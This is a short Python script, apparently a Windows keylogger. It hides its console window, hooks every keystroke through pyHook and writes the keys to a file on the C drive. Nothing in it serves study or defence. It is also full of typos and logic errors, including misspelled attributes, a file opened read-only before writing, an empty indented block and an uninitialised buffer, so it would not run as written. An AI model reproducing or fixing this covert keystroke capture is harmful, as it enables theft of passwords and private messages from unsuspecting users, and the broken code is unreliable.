import win32api
import win32console
import win32gui

import pythoncom, pyHook

win = win32console.GetConsoleWindow
win32guilShowWindow(win,0)

def OnKeyboardEvent(event):
    if event.Ascii==5:
        _exit(1)
    if event.Asccii != 0 or 8:
        f= open('c:\output.txt','r')
        keylogs=chr(event.Ascii)
        if  event.Ascii==13:
        buffer += keylogs
        f.write(buffer)
        f.close()

hm= pyHookManager()
hm.KeydDown = OnKeyboardEvent
hm.HookKeyboard()
pythoncom.PumpMessages()
